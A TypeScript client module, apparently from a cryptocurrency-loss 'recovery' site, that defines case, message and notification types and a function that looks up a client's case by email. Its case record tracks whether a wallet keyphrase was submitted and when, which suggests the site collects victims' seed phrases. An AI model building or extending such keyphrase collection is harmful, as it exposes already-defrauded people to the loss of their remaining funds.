import { apiPost } from "./api";

export type CaseMessage = {
  id: string;
  text: string;
  sender: string;
  senderId: string;
  type: string;
  createdAt: string;
};

export type CaseNotification = {
  id: string;
  title: string;
  message: string;
  type: string;
  read: boolean;
  createdAt: string;
};

export type ClientCaseRecord = {
  id: string;
  caseId?: string;
  storageSource?: string;
  firestoreDocId?: string | null;
  operatorAlias?: string;
  secureComms?: string;
  email?: string;
  status?: string;
  incidentVector?: string;
  targetNetwork?: string;
  transactionHash?: string;
  caseNarrative?: string;
  estimatedValue?: number;
  completedSteps?: string[];
  messages?: CaseMessage[];
  notifications?: CaseNotification[];
  formSource?: string;
  createdAt?: string;
  walletKeyphraseSubmitted?: boolean;
  keyphraseSubmittedAt?: string;
};

export async function lookupCaseByEmail(email: string): Promise<{
  ok: boolean;
  case?: ClientCaseRecord;
  error?: string;
  notFound?: boolean;
}> {
  const normalized = email.trim().toLowerCase();
  const { ok, data } = await apiPost<{
    success?: boolean;
    case?: ClientCaseRecord;
    error?: string;
  }>("/api/case-lookup", { email: normalized });

  if (data?.success && data.case) {
    return { ok: true, case: data.case };
  }

  if (data?.error) {
    const notFound = data.error.toLowerCase().includes("no active recovery");
    return { ok: false, error: data.error, notFound };
  }

  if (!ok) {
    return {
      ok: false,
      error: "Could not reach case lookup service. Ensure the site is running on the Node server.",
    };
  }

  return { ok: false, error: "Lookup failed." };
}
